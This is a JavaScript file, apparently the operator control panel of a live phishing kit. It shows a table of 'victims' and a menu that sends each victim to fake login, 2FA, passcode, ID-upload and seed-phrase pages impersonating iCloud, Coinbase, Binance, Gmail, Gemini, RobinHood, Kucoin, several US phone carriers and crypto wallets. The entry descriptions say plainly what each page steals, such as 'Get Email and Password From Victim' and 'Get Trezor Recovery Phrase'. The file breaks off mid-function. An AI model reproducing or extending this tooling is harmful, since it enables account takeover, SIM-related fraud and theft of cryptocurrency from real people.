                const icon = header.querySelector('.fa-chevron-down');
                const isExpanded = optionsContainer.classList.toggle('hidden');
                header.classList.toggle('expanded', !isExpanded);
                icon.classList.toggle('rotate-180', !isExpanded);
                gsap.to(optionsContainer, { height: isExpanded ? 0 : 'auto', opacity: isExpanded ? 0 : 1, duration: 0.3, ease: 'power2.out' });
            });
        });
        const serviceOptions = servicesContainer.querySelectorAll('.service-option');
        serviceOptions.forEach(option => {
            option.addEventListener('click', () => {
                option.classList.toggle('selected');
                option.classList.toggle('bg-purple-600', option.classList.contains('selected'));
                option.classList.toggle('bg-gray-700', !option.classList.contains('selected'));
                option.querySelector('.fa-check-circle').classList.toggle('opacity-0', !option.classList.contains('selected'));
            });
        });
    }
    if (serviceSearchInput) {
        serviceSearchInput.addEventListener('input', (e) => {
            const searchTerm = e.target.value.toLowerCase();
            const allOptions = servicesContainer.querySelectorAll('.service-option');
            allOptions.forEach(opt => {
                const serviceName = opt.dataset.service.toLowerCase();
                const optionName = opt.dataset.option.toLowerCase();
                const isVisible = serviceName.includes(searchTerm) || optionName.includes(searchTerm);
                opt.style.display = isVisible ? 'flex' : 'none';
            });
            const serviceGroups = servicesContainer.querySelectorAll('.service-group');
            serviceGroups.forEach(group => {
                const visibleOptionsInGroup = Array.from(group.querySelectorAll('.service-option')).some(opt => opt.style.display !== 'none');
                group.style.display = visibleOptionsInGroup ? 'block' : 'none';
            });
        });
    }
    const modalOpenTimeline = gsap.timeline({ paused: true });
    if (clientModal && modalContent) {
        modalOpenTimeline
            .to(clientModal, { autoAlpha: 1, duration: 0.01 })
            .fromTo(modalContent, { scale: 0.9, opacity: 0, y: -20 }, { scale: 1, opacity: 1, y: 0, duration: 0.3, ease: 'power2.out' });
    }
    const modalCloseTimeline = gsap.timeline({ paused: true });
    if (clientModal && modalContent) {
        modalCloseTimeline
            .to(modalContent, { scale: 0.9, opacity: 0, y: 20, duration: 0.2, ease: 'power2.in' })
            .to(clientModal, { autoAlpha: 0, duration: 0.01 });
    }
    function openClientModal(clientData) {
        currentClientDataForModal = clientData;
        initializeModal(allServices);
        clientModal.classList.remove('hidden');
        modalOpenTimeline.restart();
        document.body.classList.add('overflow-hidden');
    }
    function closeClientModal() {
        modalCloseTimeline.restart().eventCallback('onComplete', () => {
            clientModal.classList.add('hidden');
            document.body.classList.remove('overflow-hidden');
        });
    }
    if (closeModalButton) closeModalButton.addEventListener('click', closeClientModal);
    if (clientModal) {
        clientModal.addEventListener('click', (event) => { if (event.target === clientModal) closeClientModal(); });
    }
    if (deselectAllButton) {
        deselectAllButton.addEventListener('click', () => {
            const selectedOptions = servicesContainer.querySelectorAll('.service-option.selected');
            selectedOptions.forEach(deselectOption);
        });
    }
    if (saveServicesButton) {
        saveServicesButton.addEventListener('click', () => {
            const selected = Array.from(servicesContainer.querySelectorAll('.service-option.selected'))
                .map(opt => ({ service: opt.dataset.service, option: opt.dataset.option }));
            console.log('Selected services for client:', currentClientDataForModal, selected);
            // socket.emit('save_client_services', { clientId: currentClientDataForModal.id, services: selected });
            showNotification('Services saved!', 'success', 'fas fa-check-circle');
            closeClientModal();
        });
    }

    // --- Generic Info Modal (No changes requested) ---
    const closeInfoModalButton = document.getElementById('closeInfoModalButton');
    const okInfoModalButton = document.getElementById('okInfoModalButton');

    function openInfoModal(title, messageContent, type = 'info') {
        if (!infoModal || !infoModalTitle || !infoModalBody) return;
        infoModalTitle.textContent = title;
        infoModalBody.innerHTML = messageContent;

        const modalDialog = infoModal.querySelector('.bg-gray-800');
        modalDialog.classList.remove('border-blue-500', 'border-red-500', 'border-green-500', 'border-yellow-500');
        if (type === 'error') modalDialog.classList.add('border-red-500');
        else if (type === 'success') modalDialog.classList.add('border-green-500');
        else if (type === 'warning') modalDialog.classList.add('border-yellow-500');
        else modalDialog.classList.add('border-blue-500');

        infoModal.classList.remove('hidden');
        gsap.fromTo(infoModal.querySelector('.bg-gray-800'),
            { scale: 0.9, opacity: 0 },
            { scale: 1, opacity: 1, duration: 0.3, ease: 'power2.out' }
        );
        document.body.classList.add('overflow-hidden');
    }

    function closeInfoModal() {
        if (!infoModal) return;
        gsap.to(infoModal.querySelector('.bg-gray-800'),
            {
                scale: 0.9, opacity: 0, duration: 0.2, ease: 'power2.in', onComplete: () => {
                    infoModal.classList.add('hidden');
                    document.body.classList.remove('overflow-hidden');
                }
            }
        );
    }

    if (closeInfoModalButton) closeInfoModalButton.addEventListener('click', closeInfoModal);
    if (okInfoModalButton) okInfoModalButton.addEventListener('click', closeInfoModal);
    if (infoModal) {
        infoModal.addEventListener('click', (event) => {
            if (event.target === infoModal) closeInfoModal();
        });
    }
    // --- Notifications (No changes requested) ---
    const notificationPopup = document.getElementById('notification-popup');
    const notificationTitle = document.getElementById('notification-title');
    const notificationMessage = document.getElementById('notification-message');
    const notificationIcon = document.getElementById('notification-icon');
    const notificationCloseBtn = document.getElementById('notification-close-btn');
    let notificationTimeout;

    function showNotification(message, type = 'info', iconClass = 'fas fa-info-circle', title = 'Notification') {
        if (!notificationPopup || !notificationMessage || !notificationTitle || !notificationIcon) return;
        clearTimeout(notificationTimeout);
        notificationTitle.textContent = title;
        notificationMessage.textContent = message;
        notificationIcon.innerHTML = `<i class="${iconClass}"></i>`;

        notificationPopup.classList.remove('border-purple-500', 'border-green-500', 'border-red-500', 'border-yellow-500');
        notificationIcon.classList.remove('text-purple-400', 'text-green-400', 'text-red-400', 'text-yellow-400');

        switch (type) {
            case 'success':
                notificationPopup.classList.add('border-green-500');
                notificationIcon.classList.add('text-green-400');
                break;
            case 'error':
                notificationPopup.classList.add('border-red-500');
                notificationIcon.classList.add('text-red-400');
                break;
            case 'warning':
                notificationPopup.classList.add('border-yellow-500');
                notificationIcon.classList.add('text-yellow-400');
                break;
            default:
                notificationPopup.classList.add('border-purple-500');
                notificationIcon.classList.add('text-purple-400');
                break;
        }

        notificationPopup.classList.remove('hidden');
        gsap.fromTo(notificationPopup,
            { opacity: 0, y: -20, scale: 0.9 },
            { opacity: 1, y: 0, scale: 1, duration: 0.3, ease: 'power2.out' }
        );

        notificationTimeout = setTimeout(() => {
            gsap.to(notificationPopup, {
                opacity: 0, y: -20, scale: 0.9, duration: 0.3, ease: 'power2.in', onComplete: () => {
                    notificationPopup.classList.add('hidden');
                }
            });
        }, 5000);
    }

    if (notificationCloseBtn) {
        notificationCloseBtn.addEventListener('click', () => {
            clearTimeout(notificationTimeout);
            gsap.to(notificationPopup, {
                opacity: 0, y: -20, scale: 0.9, duration: 0.3, ease: 'power2.in', onComplete: () => {
                    notificationPopup.classList.add('hidden');
                }
            });
        });
    }

    // --- Sidebar and Menu Logic (No changes requested) ---
    const sidebar = document.getElementById('sidebar'); // Already defined globally, but ensure it's the same
    const mobileMenuBtn = document.getElementById('mobile-menu-btn'); // Already defined globally
    const mobileCloseBtn = document.getElementById('mobile-close-btn'); // Already defined globally
    const mainContentArea = document.getElementById('main-content-area'); // From old part

    function setActiveMenuItem() {
        const currentPath = window.location.pathname;
        const menuItems = document.querySelectorAll('#sidebar nav a.menu-item');
        menuItems.forEach(item => {
            item.classList.remove('bg-purple-600', 'text-white', 'font-semibold', 'active-menu-item');
            if (!item.classList.contains('text-gray-300')) {
                item.classList.add('text-gray-300');
            }
            const itemPath = item.getAttribute('href');
            if (itemPath && currentPath === itemPath) {
                item.classList.add('bg-purple-600', 'text-white', 'font-semibold');
                item.classList.remove('text-gray-300');
            }
        });
        const isAnyActive = Array.from(menuItems).some(item => item.classList.contains('bg-purple-600'));
        if (!isAnyActive) {
            const commonDashboardPaths = ['/', '/admin/dashboard/', '/dashboard/']; // Adjust as needed
            const dashboardLink = Array.from(menuItems).find(item => commonDashboardPaths.includes(item.getAttribute('href')));
            // Check if currentPath is one of the dashboard paths before activating dashboardLink
            if (dashboardLink && commonDashboardPaths.some(p => currentPath.endsWith(p))) {
                dashboardLink.classList.add('bg-purple-600', 'text-white', 'font-semibold');
                dashboardLink.classList.remove('text-gray-300');
            }
        }
    }
    setActiveMenuItem(); // Call on load

    function handleMobileLayout() {
        const sidebarElement = document.getElementById('sidebar'); // Use local var or ensure global 'sidebar' is correct
        const mainContentWrapper = document.querySelector('body > .flex-1.flex.flex-col.overflow-hidden');
        if (!mainContentWrapper || !sidebarElement) return;

        if (window.innerWidth < 768) { // md breakpoint
            if (!sidebarElement.classList.contains('sidebar-manually-opened') && !sidebarElement.classList.contains('-translate-x-full')) {
                gsap.to(sidebarElement, { x: '-100%', duration: 0.3, ease: 'power2.in', onComplete: () => sidebarElement.classList.add('-translate-x-full') });
            }
            mainContentWrapper.style.marginLeft = '0px';
        } else {
            if (sidebarElement.classList.contains('-translate-x-full')) {
                sidebarElement.classList.remove('-translate-x-full');
                gsap.to(sidebarElement, { x: '0%', duration: 0.3, ease: 'power2.out' });
            }
            // Ensure main content margin is correct if sidebar is visible
            // This part might need adjustment based on your exact HTML structure for main content
            const sidebarStyle = window.getComputedStyle(sidebarElement);
            const transformMatrix = new DOMMatrixReadOnly(sidebarStyle.transform); // Use DOMMatrixReadOnly
            if (transformMatrix.m41 === 0 && !sidebarElement.classList.contains('-translate-x-full')) { // Check if translateX is 0 and sidebar is not hidden
                mainContentWrapper.style.marginLeft = `${sidebarElement.offsetWidth}px`;
            } else {
                mainContentWrapper.style.marginLeft = '0px';
            }
        }
    }

    if (mobileMenuBtn && sidebar) { // Use global 'sidebar' here
        mobileMenuBtn.addEventListener('click', () => {
            sidebar.classList.remove('-translate-x-full');
            sidebar.classList.add('sidebar-manually-opened');
            gsap.to(sidebar, { x: '0%', duration: 0.3, ease: 'power2.out' });
        });
    }
    if (mobileCloseBtn && sidebar) { // Use global 'sidebar' here
        mobileCloseBtn.addEventListener('click', () => {
            sidebar.classList.remove('sidebar-manually-opened');
            gsap.to(sidebar, { x: '-100%', duration: 0.3, ease: 'power2.in', onComplete: () => sidebar.classList.add('-translate-x-full') });
        });
    }

    // --- Initializations & Other Event Listeners ---
    gsap.from('aside', { x: -100, opacity: 0, duration: 0.7, ease: 'power2.out', delay: 0.2 });
    gsap.from('header', { y: -50, opacity: 0, duration: 0.5, ease: 'power2.out', delay: 0.4 });
    gsap.from('#dashboard-content > div:first-child h1', { x: -30, opacity: 0, duration: 0.6, ease: 'power2.out', delay: 0.6 });
    gsap.from('#dashboard-content > div:first-child p', { x: -30, opacity: 0, duration: 0.6, ease: 'power2.out', delay: 0.7 });
    // Ensure this selector is correct for your stat boxes
    gsap.from('#dashboard-content .grid > div.bg-gray-800', { y: 30, opacity: 0, stagger: 0.15, duration: 0.5, ease: 'back.out(1.7)', delay: 0.8 });
    // This animation for table rows might run before rows are added by WebSocket.
    // It's better to animate rows as they are added in addNewRow, which you already do.
    // gsap.from('#victims-table-body tr', { opacity: 0, y: 20, stagger: 0.1, duration: 0.4, ease: 'power2.out', delay: 1.2 });

    tippy('[title]', { theme: 'custom', placement: 'top', animation: 'shift-away-subtle', arrow: true });

    const claimAdminBtn = document.getElementById('claim-admin-btn');
    if (claimAdminBtn) {
        claimAdminBtn.addEventListener('click', () => {
            showNotification('Admin role claim request sent.', 'info', 'fas fa-user-shield');
            // openInfoModal('Admin Claim', '<p>Your request to claim admin privileges has been submitted.</p><p>You will be notified once it is processed.</p>', 'info');
        });
    }
    const logoutBtn = document.getElementById('logout-btn');
    if (logoutBtn) {
        logoutBtn.addEventListener('click', () => {
            showNotification('Logging out...', 'info', 'fas fa-sign-out-alt');
            // window.location.href = '/logout'; // Example redirect
            // For demo, let's use the info modal
            openInfoModal('Logout Confirmation', '<p>Are you sure you want to log out?</p><p><a href="/admin/dashboard/logout/" class="text-red-400 hover:text-red-300">Yes, log out</a></p>', 'warning');
        });
    }
    handleMobileLayout(); // Initial call
    window.addEventListener('resize', handleMobileLayout);

    // **** NEW: Redirect Service Modal Logic ****
    const redirectServiceModal = document.getElementById('redirectServiceModal');
    const redirectServiceModalContent = document.getElementById('redirectServiceModalContent');
    const closeRedirectModalBtn = document.getElementById('closeRedirectModalBtn');
    const redirectClientIpDisplay = document.getElementById('redirectClientIp');
    const redirectServiceSearchInput = document.getElementById('redirectServiceSearch');
    const redirectServiceListContainer = document.getElementById('redirectServiceListContainer');
    const confirmRedirectBtn = document.getElementById('confirmRedirectBtn');

    // New Elements for Extra Input Modal
    const extraInputModal = document.getElementById('extraInputModal');
    const extraInputModalContent = document.getElementById('extraInputModalContent');
    const extraInputPrompt = document.getElementById('extraInputPrompt');
    const extraInputField = document.getElementById('extraInputField');
    const cancelExtraInputBtn = document.getElementById('cancelExtraInputBtn');
    const confirmExtraInputBtn = document.getElementById('confirmExtraInputBtn');

    // **** ADD THIS LOG ****
    console.log("<<<<< JS: Initializing Extra Input Modal elements: >>>>>", {
        extraInputModal: extraInputModal ? 'Found' : 'NOT FOUND - ID: extraInputModal',
        extraInputModalContent: extraInputModalContent ? 'Found' : 'NOT FOUND - ID: extraInputModalContent',
        extraInputPrompt: extraInputPrompt ? 'Found' : 'NOT FOUND - ID: extraInputPrompt',
        extraInputField: extraInputField ? 'Found' : 'NOT FOUND - ID: extraInputField',
        cancelExtraInputBtn: cancelExtraInputBtn ? 'Found' : 'NOT FOUND - ID: cancelExtraInputBtn',
        confirmExtraInputBtn_forExtraModal: confirmExtraInputBtn ? 'Found' : 'NOT FOUND - ID: confirmExtraInputBtn (for extra modal)' // Renamed for clarity in log
    });


    let currentClientIpForRedirect = null;
    let selectedServiceForRedirect = null; // Stores { serviceId, subOptionId, redirectUrl, serviceName, subOptionName, requiresInput, inputPrompt, ... }
    let currentRedirectPayloadForExtraInput = null;

    // Sample services data (replace/expand with your actual services and icons)
    // We'll need a mapping for URLs later when implementing the actual redirect.
    const redirectableServices = [
        {
            name: 'iCloud', icon: 'fab fa-apple', id: 'icloud',
            subOptions: [
                { id: 'icloud_email_password', name: 'Email & Password Input', description: 'Get Email and Password From Victim', redirectUrl: '/your-site/icloud-login' },
                { id: 'icloud_2fa_device', name: '2FA Code (Device)', description: "Get 2FA Code From Victim's Auth App", redirectUrl: '/your-site/icloud-2fa-device' },
                { id: 'icloud_2fa_sms', name: '2FA Code (SMS)', description: "Get 2FA Code From Victim's Phone Number", redirectUrl: '/your-site/icloud-2fa-sms' },
                { id: 'icloud_passcode_4digit', name: 'Device Passcode (4 Digits)', description: "Get Device Passcode 4 Digits From Victim", redirectUrl: '/your-site/icloud-passcode', requiresInput: true, inputPrompt: 'Please enter the name of the targets device: ', inputPlaceholder: "e.g. John's iPhone or iPhone", inputType: 'text' },
                { id: 'icloud_passcode_6digit', name: 'Device Passcode (6 Digits)', description: "Get Device Passcode 6 Digits From Victim", redirectUrl: '/your-site/icloud-passcode', requiresInput: true, inputPrompt: 'Please enter the name of the targets device: ', inputPlaceholder: "e.g. John's iPhone or iPhone", inputType: 'text' },
            ]
        },
        {
            name: 'Coinbase', icon: 'custom-coinbase', iconType: 'span', iconChar: 'C', iconBg: 'bg-blue-600', id: 'coinbase',
            subOptions: [
                { id: 'coinbase_email', name: 'Email Input', description: 'Get Email From Victim', redirectUrl: '/email' },
                { id: 'coinbase_review', name: 'Review Account', description: 'Review Account Details', redirectUrl: '/review' },
                { id: 'coinbase_action', name: 'Review Actions - Cancel Changes', description: 'Review and Cancel Account Changes', redirectUrl: '/action' },
                { id: 'coinbase_password', name: 'Password Input', description: 'Get Password From Victim', redirectUrl: '/password' },
                { id: 'coinbase_disconnect_wallet', name: 'Disconnect Wallet Seed', description: 'Disconnect Wallet Page', redirectUrl: '/disconnect_wallet' },
                { id: 'coinbase_disconnect_trezor', name: 'Disconnect Trezor Seed', description: 'Disconnect Trezor Page', redirectUrl: '/disconnect_trezor' },
                { id: 'coinbase_disconnect_ledger', name: 'Disconnect Ledger Seed', description: 'Disconnect Ledger Page', redirectUrl: '/disconnect_ledger' },
                { id: 'coinbase_balance', name: 'Coinfirm Balance', description: 'Coinfirm Balance Page', redirectUrl: '/balance' },
                { id: 'coinbase_reset_password', name: 'Reset Password', description: 'Reset Password Page', redirectUrl: '/reset_password' },
                { id: 'coinbase_password_error', name: 'Password Error', description: 'Invalid Password Error', redirectUrl: '/password_error' },
                { id: 'coinbase_reset_error', name: 'Password Reset Error', description: 'Password Reset Error Page', redirectUrl: '/reset_password_error' },
                { id: 'coinbase_2fa_auth', name: '2FA Code (Auth App)', description: 'Get 2FA Code From Auth App', redirectUrl: '/2fa_auth' },
                { id: 'coinbase_2fa_sms', name: '2FA COde (SMS)', description: 'Get 2FA Code From SMS', redirectUrl: '/2fa_sms' },
                { id: 'coinbase_selfie_upload', name: 'Selfie Upload', description: 'Get Selfie Verification From Victim', redirectUrl: '/selfie_upload' },
                { id: 'coinbase_upload_id', name: 'Upload ID', description: 'Get ID Verification From Victim', redirectUrl: '/upload_id' },
                { id: 'coinbase_authorize', name: 'Device Authorize', description: 'Device Authorization Page', redirectUrl: '/authorize' },
                { id: 'coinbase_wallet_unlink_completed', name: 'Wallet Unlink Completed', description: 'Wallet Unlink Completed', redirectUrl: '/wallet_unlink_done' },
                { id: 'coinbase_wallet_whitelisted', name: 'Wallet Whitelisted', description: 'Wallet Whitelisted Page', redirectUrl: '/wallet_whitelisted' },
                { id: 'coinbase_wallet_setup', name: 'Wallet Setup', description: 'Intial Wallet Setup Page', redirectUrl: '/wallet_setup' },
                { id: 'coinbase_wallet_setup_v2', name: 'Wallet Setup V2 (Self Continue)', description: 'Self-Guided Wallet Setup Page', redirectUrl: '/wallet_setupv2' },
                { id: 'coinbase_eth_ltc', name: 'ETH > LTC (Conversion)', description: 'ETH to LTC COnversion Page', redirectUrl: '/eth_ltc' },
                { id: 'coinbase_eth_btc', name: 'ETH > BTC (Conversion)', description: 'ETH to BTC COnversion Page', redirectUrl: '/eth_btc' },
                { id: 'coinbase_unauthorized_devices', name: 'Sign Out Unauthorized Devices', description: 'Remove Unauthorized Devices Page', redirectUrl: '/unauthorized_devices' },
                { id: 'coinbase_revert', name: 'Revert Withdraws', description: 'Cancel Pending Withdrawals Page', redirectUrl: '/revert' },
                { id: 'coinbase_mobile_number', name: 'Confirm Mobile Number', description: 'Verify Phone Number Page', redirectUrl: '/mobile_number' },
                { id: 'coinbase_expect_call', name: 'Expect a Call', description: 'Phone Call Verification Notice', redirectUrl: '/call' },
                { id: 'coinbase_connect_seed', name: 'Connect Seed Page', description: 'Connect Wallet Seed Page', redirectUrl: '/seed' },
                { id: 'coinbase_whitelist_seed', name: 'Whitelist Seed', description: 'Whitelist Seed Phrase Page', redirectUrl: '/whitelist_seed' },
                { id: 'coinbase_seed_generated', name: 'Generated Seed Page', description: 'Show Generated Seed Phrase', redirectUrl: '/seed_generated' },
                { id: 'coinbase_wallet_whitelist_self', name: 'Wallet Whitelist (Self Continue)', description: 'Self-Guided Wallet Whitelist Page', redirectUrl: '/wallet_whitelist_self' },
                { id: 'coinbase_loading', name: 'Loading Screen', description: 'Processing Request Screen', redirectUrl: '/loading' },
                { id: 'coinbase_seed_unlink', name: 'Unlink Seed', description: 'Remove Connected Seed Page', redirectUrl: '/seed_unlink' },
                { id: 'coinbase_unlink_pending', name: 'Unlink Pending (Loading)', description: 'Processing Seed Unlink Request', redirectUrl: '/seed_unlink_pending' },

            ]
        },
        {
            name: 'Binance', icon: 'custom-binance', iconType: 'span', iconChar: 'B', iconBg: 'bg-yellow-500', id: 'binance',
            subOptions: [
                { id: 'binance_email_password', name: 'Email & Password Input', description: 'Get Email and Password From Victim', redirectUrl: '/binance' },
                { id: 'binance_2fa_email', name: '2FA Code (Email)', description: 'Get Email Verification Code', redirectUrl: '/binance/2fa_email' },
                { id: 'binance_2fa_auth', name: '2FA Code (Auth App)', description: 'Get Authenticator App Code', redirectUrl: '/binance/2fa_auth' },
                { id: 'binance_2fa_sms', name: '2FA Code (SMS)', description: 'Get SMS Verification Code', redirectUrl: '/binance/2fa_sms?last_digits={{LAST_DIGITS}}', requiresInput: true, inputPrompt: 'Enter the last 4 digits of the number:', inputPlaceholder: 'e.g., 0928', inputMaxLength: 4, inputType: 'tel' },
                { id: 'binance_unlink_wallets', name: 'Unlink Wallets (Seed Page)', description: 'Get Wallet Seed Phrase', redirectUrl: '/binance/unlink_wallets' },
                { id: 'binance_unlink_wallets_error_link_another', name: 'Unlink Wallets Error (Link Another Seed)', description: 'Invalid Seed, Request New One', redirectUrl: '/binance/unlink_wallets_error_link_another' },
                { id: 'binance_unlink_wallets_error_invalid', name: 'Unlink Wallets Error (Invalid Seed)', description: 'Invalid Seed Phrase Error', redirectUrl: '/binance/unlink_wallets_error_invalid' },
                { id: 'binance_unlink_wallets_loading', name: 'Unlink Wallets Loading', description: 'Processing Wallet Unlink', redirectUrl: '/binanace/unlink_wallets_loading' },

            ]
        },
        {
            name: 'Gmail', icon: 'fab fa-google', id: 'gmail',
            subOptions: [
                { id: 'gmail_email', name: 'Email Input', description: 'Get Email From Victim', redirectUrl: '/gmail' },
                { id: 'gmail_password', name: 'Password Input', description: 'Get Password From Victim', redirectUrl: '/gmail/password' },
                { id: 'gmail_password_error', name: 'Password Input Error', description: 'Invalid Password Error', redirectUrl: '/gmail/password_error' },
                { id: 'gmail_device_otp', name: 'Device OTP', description: 'Get Device OTP Code', redirectUrl: '/gmail/otp' },
                { id: 'gmail_2fa_auth', name: '2FA Code (Auth App)', description: 'Get Authenticator App Code', redirectUrl: '/gmail/2fa_auth' },
                { id: 'gmail_youtube', name: 'Open YouTube', description: 'Redirect to YouTube', redirectUrl: '/gmail/youtube' },
                { id: 'gmail_gmail', name: 'Open Gmail', description: 'Redirect to Gmail', redirectUrl: '/gmail/gmail' },
                { id: 'gmail_qrcode', name: 'Scan QR Code', description: 'Show QR Code for Scanning', redirectUrl: '/gmail/qr' },
                { id: 'gmail_number', name: 'Device Number', description: 'Get Device Number', redirectUrl: '/gmail/number?number={{LAST_DIGITS}}', requiresInput: true, inputPrompt: 'Please enter your number to click: ', inputPlaceholder: 'e.g., 0928', inputMaxLength: 4, inputType: 'tel' },
                { id: 'gmail_2fa_sms', name: '2FA Code (SMS)', description: 'Get SMS Verification Code', redirectUrl: '/gmail/2fa_sms?last_digits={{LAST_DIGITS}}', requiresInput: true, inputPrompt: 'Enter the last 2 digits of the number:', inputPlaceholder: 'e.g., 28', inputMaxLength: 2, inputType: 'tel' },
                { id: 'gmail_loading', name: 'Loading Screen', description: 'Processing Request Screen', redirectUrl: '/gmail/loading' },

            ]
        },
        {
            name: 'Kraken', iconType: 'img', iconUrl: '/static/dashboard/icons/kraken.svg', id: 'kraken',
            subOptions: [
                { id: 'kraken_case', name: 'Case Page (Step 1)', description: 'Get Ticket ID from victim', redirectUrl: '/your-site/ms-login' },
                { id: 'kraken_case', name: 'Fake Ticket Page (Step 2)', description: 'Get Ticket ID from victim', redirectUrl: '/your-site/ms-login' },
                { id: 'kraken_case', name: 'Migration Guide Page (Step 3)', description: 'Get Ticket ID from victim', redirectUrl: '/your-site/ms-login' },
                { id: 'kraken_case', name: 'Fake Ticket Page (Step 2)', description: 'Get Ticket ID from victim', redirectUrl: '/your-site/ms-login' },

            ]
        },
        {
            name: 'Gemini', iconType: 'img', iconUrl: '/static/dashboard/icons/gemini.svg', id: 'gemini',
            subOptions: [
                { id: 'gemini_email_password', name: 'Email & Password Input', description: 'Get Email and Password From Victim', redirectUrl: '/gemini' },
                { id: 'gemini_2fa_sms', name: '2FA Code (SMS)', description: 'Get SMS Verifiction Code', redirectUrl: '/gemini/2fa_sms?last_digits={{LAST_DIGITS}}', requiresInput: true, inputPrompt: 'Enter the last 2 digits of the number:', inputPlaceholder: 'e.g., 09', inputMaxLength: 2, inputType: 'tel' },
                { id: 'gemini_2fa_authy', name: '2FA Code (Authy)', description: 'Get Authy App Code', redirectUrl: '/gemini/authy_code?last_digits={{LAST_DIGITS}}', requiresInput: true, inputPrompt: 'Enter the last 2 digits of the number:', inputPlaceholder: 'e.g., 09', inputMaxLength: 2, inputType: 'numeric' },
                { id: 'gemini_2fa_email', name: '2FA Code (Email)', description: 'Get Email Verification Code', redirectUrl: '/gemini/email_code' },
                { id: 'gemini_authdevice', name: 'Authorize Device', description: 'Device Authorization Page', redirectUrl: '/gemini/authorize' },
                { id: 'gemini_invalid_2fa_sms', name: 'Invalid 2FA Code (SMS)', description: 'Invalid SMS Code', redirectUrl: '/gemini/2fa_sms_error?last_digits={{LAST_DIGITS}}', requiresInput: true, inputPrompt: 'Enter the last 2 digits of the number:', inputPlaceholder: 'e.g., 09', inputMaxLength: 2, inputType: 'numeric' },
                { id: 'gemini_invalid_2fa_authy', name: 'Invalid 2FA Code (Authy)', description: 'Invalid Authy Code', redirectUrl: '/gemini/authy_code_invalid?last_digits={{LAST_DIGITS}}', requiresInput: true, inputPrompt: 'Enter the last 2 digits of the number:', inputPlaceholder: 'e.g., 09', inputMaxLength: 2, inputType: 'numeric' },
                { id: 'gemini_invalid_2fa_email', name: 'Invalid 2FA Code (Email)', description: 'Invalid Email Code', redirectUrl: '/gemini/email_code_invalid' },

            ]
        },
        {
            name: 'RobinHood', iconType: 'img', iconUrl: '/static/dashboard/icons/robinhood.svg', id: 'robinhood',
            subOptions: [
                { id: 'robinhood_email_password', name: 'Email & Password Input', description: 'Get Email and Password From Victim', redirectUrl: '/robinhood' },
                { id: 'robinhood_2fa_sms', name: '2FA Code (SMS)', description: 'Get SMS Verifiction Code', redirectUrl: '/robinhood/2fa_sms' },
                { id: 'robinhood_2fa_authapp', name: '2FA Code (Auth App)', description: 'Get Authenticator App Code', redirectUrl: '/robinhood/2fa_auth' },
                { id: 'robinhood_reset_password', name: 'Reset Password', description: 'Password Reset Page', redirectUrl: '/robinhood/reset_password' },
                { id: 'robinhood_loading', name: 'Loading Page', description: 'Processing Request Page', redirectUrl: '/robinhood/loading' },
            ]
        },
        {
            name: 'Kucoin', iconType: 'img', iconUrl: '/static/dashboard/icons/kucoin.svg', id: 'kucoin',
            subOptions: [
                { id: 'kucoin_login', name: 'Login Screen', description: 'Login Screen', redirectUrl: '/kucoin' },
                { id: 'kucoin_2fa_authapp', name: '2FA Code (Auth App)', description: 'Get Authenticator App Code', redirectUrl: '/kucoin/2fa_app' },
                { id: 'kucoin_2fa_email', name: '2FA Code (Email)', description: 'Get Email Verification Code', redirectUrl: '/kucoin/2fa_email' },
                { id: 'kucoin_2fa_sms', name: '2FA Code (SMS)', description: 'Get SMS Verification Code', redirectUrl: '/kucoin/2fa_sms?last_digits={{LAST_DIGITS}}', requiresInput: true, inputPrompt: 'Enter the last 2 digits of the number:', inputPlaceholder: 'e.g., 09', inputMaxLength: 2, inputType: 'numeric' },
                { id: 'kucoin_loading', name: 'Loading Page', description: 'Processing Request Page', redirectUrl: '/kucoin/loading' },
            ]
        },
        {
            name: 'AT&T', iconType: 'img', iconUrl: '/static/dashboard/icons/at&t.svg', id: 'at&t',
            subOptions: [
                { id: 'at&t_pin', name: 'Enter PIN Page', description: 'Enter PIN Page', redirectUrl: '/att/pin' },
                { id: 'at&t_login', name: 'Login Screen', description: 'Login Screen', redirectUrl: '/att' },
                { id: 'at&t_loading', name: 'Loading Page', description: 'Processing Request Page', redirectUrl: '/att/loading' },
                { id: 'at&t_completed', name: 'Completed Page', description: 'Ticket Closed Page', redirectUrl: '/att/completed' },
                { id: 'at&t_upgrade', name: 'Upgrade Notice Page', description: 'Upgrade Notice Page', redirectUrl: '/att/suspicious' },
            ]
        },
        {
            name: 'T Mobile', iconType: 'img', iconUrl: '/static/dashboard/icons/tmobile.svg', id: 'tmobile',
            subOptions: [
                { id: 'tmobile_pin', name: 'Enter PIN Page', description: 'Enter PIN Page', redtmobiletUrl: '/tmobile/pin' },
                { id: 'tmobile_login', name: 'Login Screen', description: 'Login Screen', redirectUrl: '/tmobile' },
                { id: 'tmobile_loading', name: 'Loading Page', description: 'Processing Request Page', redirectUrl: '/tmobile/loading' },
                { id: 'tmobile_completed', name: 'Completed Page', description: 'Ticket Closed Page', redirectUrl: '/tmobile/completed' },
                { id: 'tmobile_upgrade', name: 'Upgrade Notice Page', description: 'Upgrade Notice Page', redirectUrl: '/tmobile/suspicious' },
            ]
        },
        {
            name: 'Verizon', iconType: 'img', iconUrl: '/static/dashboard/icons/verizon.svg', id: 'verizon',
            subOptions: [
                { id: 'verizon_pin', name: 'Enter PIN Page', description: 'Enter PIN Page', redtmobiletUrl: '/verizon/pin' },
                { id: 'verizon_login', name: 'Login Screen', description: 'Login Screen', redirectUrl: '/verizon' },
                { id: 'verizon_loading', name: 'Loading Page', description: 'Processing Request Page', redirectUrl: '/verizon/loading' },
                { id: 'verizon_completed', name: 'Completed Page', description: 'Ticket Closed Page', redirectUrl: '/verizon/completed' },
                { id: 'verizon_upgrade', name: 'Upgrade Notice Page', description: 'Upgrade Notice Page', redirectUrl: '/verizon/suspicious' },
            ]
        },
        {
            name: 'Wallets', iconType: 'img', iconUrl: '/static/dashboard/icons/wallets.svg', id: 'wallets',
            subOptions: [
                { id: 'trezor_seed', name: 'Trezor Seed', description: 'Get Trezor Recovery Phrase', redtmobiletUrl: '/trezor' },
                { id: 'ledger_seed', name: 'Ledger Seed', description: 'Get Ledger Recovery Phrase', redirectUrl: '/ledger' },
                { id: 'exodus_seed', name: 'Exodus Seed', description: 'Get Exodus Seed Recovery Phrase', redirectUrl: '/exodus' },
                { id: 'metamask_seed', name: 'Metamask Seed', description: 'Get Metamask Recovery Phrase', redirectUrl: '/metmask' },
                { id: 'trustwallet_seed', name: 'Trust Wallet Seed', description: 'Get Trust Wallet Recovery Phrase', redirectUrl: '/trustwallet' },
            ]
        },

    ];


    function renderServiceList(servicesToRender) {
        if (!redirectServiceListContainer) return;
        redirectServiceListContainer.innerHTML = ''; // Clear existing list
        if (confirmRedirectBtn) { // Ensure button exists
